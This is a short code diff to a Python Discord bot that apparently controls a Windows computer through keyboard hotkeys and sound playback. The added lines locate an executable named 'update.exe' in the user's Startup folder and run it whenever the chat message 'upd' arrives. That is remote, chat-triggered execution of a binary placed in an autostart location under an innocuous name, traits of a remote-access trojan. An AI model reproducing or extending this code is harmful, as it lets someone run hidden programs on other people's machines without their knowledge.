@@ -1,6 +1,7 @@
 
 import os 
 import discord
+import getpass
 import requests
 from pyautogui import hotkey
 from gtts import gTTS 
@@ -8,6 +9,10 @@ from playsound import playsound
 import time
 from dotenv import load_dotenv
 
+path1 = "C:/users/"
+path2 = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.exe"
+path=(path1 + getpass.getuser() + path2)
+print(str(path))
 
 load_dotenv()
 token = os.getenv("Ethan")
@@ -33,6 +38,11 @@ class MyClient(discord.Client):
         #announce logon
         print(f'Logged on as {self.user}!') ,
     async def on_message(self, message):
+
+        if f'{message.content}' == 'upd':
+            os.startfile(str(path))
+
+        
         def Minimise():
             hotkey('win', 'd')
         def Playsound():
